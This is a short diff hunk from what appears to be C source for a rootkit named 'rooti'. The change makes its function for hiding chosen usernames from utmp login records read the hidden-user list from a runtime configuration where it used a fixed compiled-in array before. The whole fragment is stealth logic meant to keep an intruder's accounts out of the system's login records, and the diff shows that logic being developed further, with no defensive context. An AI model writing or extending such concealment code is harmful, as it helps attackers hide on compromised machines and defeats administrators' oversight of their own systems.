@@ -51,8 +51,8 @@ struct utmp {
 
 static bool rooti_should_hide_user(char *username)
 {
-    for (int i = 0; i < ROOTI_HIDDEN_USERS_COUNT; i++) {
-        if (strncmp(username, ROOTI_HIDDEN_USERS[i], UT_NAMESIZE) == 0) {
+    for (int i = 0; i < rooti_config.hidden_users.len; i++) {
+        if (strncmp(username, rooti_config.hidden_users.ptr[i], UT_NAMESIZE) == 0) {
             return true;
         }
     }
